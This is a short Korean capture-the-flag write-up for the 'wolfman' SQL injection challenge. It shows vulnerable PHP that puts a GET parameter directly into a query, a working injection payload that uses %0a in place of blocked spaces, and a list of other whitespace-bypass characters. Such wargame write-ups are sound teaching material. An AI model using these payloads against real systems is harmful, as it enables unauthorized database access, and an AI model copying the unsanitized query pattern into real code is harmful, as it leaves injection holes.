# wolfman

## 1. Code
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
  $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("wolfman"); 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- 공백을 필터링 한다.

## 3. Solution
공백 우회를 통해 문제를 해결할 수 있다.


변수명 | 값
---|:---:
`pw` | 1234'`%0a`or`%0a`id='admin


공백(0x20)을 우회하는 방법에는 여러가지가 있다. 
`%0a`, `%0b`, `%0c`, `%0d` ...

간단한 문제이지만, 공백 우회에 관한 개념이 없다면 어려울 수 있는 문제이다.